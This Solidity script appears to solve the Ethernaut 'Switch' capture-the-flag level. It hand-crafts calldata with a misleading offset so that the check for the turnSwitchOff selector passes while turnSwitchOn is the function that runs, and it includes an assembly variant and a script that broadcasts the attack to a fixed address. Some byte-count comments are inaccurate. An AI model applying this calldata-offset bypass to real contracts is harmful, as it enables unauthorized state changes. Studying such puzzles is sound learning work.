
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Switch.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


/*

    Just have to flip the switch. Can't be that hard, right?

    Things that might help:
    Understanding how CALLDATA is encoded.

    Solution
    We need to recreate the bottom data
    We offset the turnSwitchOff to start at index 68 of bytes to pass the modifier
    Then we need to add more empty data and place turnSwitchOn as the last function to call
    Whatever number we put for uint we get / 4 zeros
    uint256 = 64 0s

    0x30c13ade -> function selector for flipSwitch(bytes memory data)
    0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
    0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
    20606e1500000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
    76227e1200000000000000000000000000000000000000000000000000000000

*/

contract SwitchAttack {


    constructor(address _switch) {


        Switch switchContract = Switch(_switch);
        bytes32 flipSwitch = switchContract.flipSwitch.selector;
        bytes32 flipOff = switchContract.turnSwitchOff.selector;
        bytes32 flipOn = switchContract.turnSwitchOn.selector;

        bytes memory callData = abi.encodePacked(
            flipSwitch, // 4 bytes = 8 characters
            uint32(96), // 32 bytes = 64 zeros // Place 60 at the end of the slot
            uint224(0), // 32 bytes = 64 zeros
            uint32(0), // 4 bytes = 8 zeros
            flipOff, // 4 bytes = 8 zeros
            uint256(4), // 66.5 bytes = 133 zeros // Place 4 before the turnSwitchOn selector
            flipOn
        );
        console.logBytes(callData);
        _switch.call(callData);

        /*

        Solution 2

        flipSwitch() = 0x30c13ade
        turnSwitchOff() = 0x20606e15
        turnSwitchOn() = 0x76227e12
        */
        // assembly {
        //     // flipSwitch()
        //     mstore(0x00, hex"30c13ade")
        //     // data part for `_data` starts at argument block's 68 bytes (0x20)
        //     mstore(0x04, 0x44)
        //     // leave empty bytes
        //     mstore(0x24, 0x00)
        //     // turnSwitchOff() selector to satisfy onlyOff() modifier
        //     mstore(0x44, hex"20606e15")
        //     // data part for `_data` starts here. first 32 bytes is length - 0x04
        //     mstore(0x48, 0x04)
        //     // next 4 bytes is the bytes data itself - function selector for turnSwitchOn()
        //     mstore(0x68, hex"76227e12")

        //     // call _switch.flipSwitch()
        //     if iszero(call(gas(), _switch, 0, 0, 0x7e, 0, 0)) {
        //         revert(0, 0)
        //     }
        // }
    }
}

contract SwitchSolution is Script {

    Switch switchContract = Switch(0x90f1856277420fdF9bF5475A39A24a158007ca2f);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new SwitchAttack(address(switchContract));
        vm.stopBroadcast();
        require(switchContract.switchOn() == true);
    }
}